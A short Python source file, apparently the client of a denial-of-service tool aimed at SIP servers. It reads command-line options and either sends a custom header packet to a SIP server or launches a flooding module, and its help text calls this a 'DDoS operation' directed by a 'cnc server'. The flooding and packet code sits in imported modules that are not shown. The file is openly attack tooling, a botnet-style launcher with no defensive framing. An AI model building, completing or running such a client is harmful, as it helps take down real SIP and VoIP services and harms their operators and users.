import sys
import getopt
import readFile
import sendCustomPacket
import flooding


mflag = False
try:
    opts, args = getopt.getopt(sys.argv[1:], "h:s:i:m:")
except getopt.GetoptError as e:
    print("ERROR: Invalid parameters")
    print("Use client.py -h for help")
    sys.exit(2)
if opts.__len__() < 2:
    print("ERROR: Invalid parameters")
    print("Use client.py -h for help")
    sys.exit(2)
for o, a in opts:
    if o == '-s':
        serveraddress = a
    if o == '-i':
        local_ip = a
    if o == '-m':
        message = readFile.ReadFile.read_message(a)
        mflag = True
    elif o == '-h':
        print("Usage:")
        print("DDoS operation: client.py -s <ip of cnc server> -i <local ip address> without brackets")
        print("Send customized headers: client.py -m <path to header file> -s <ip of sip servery> without brackets")
        sys.exit(0)

if mflag:
    sc = sendCustomPacket.SendCustomPacket()
    sc.send_custom_request(message, serveraddress)
else:
    f = flooding.FloodModule()
    f.init_flooding(serveraddress, local_ip)
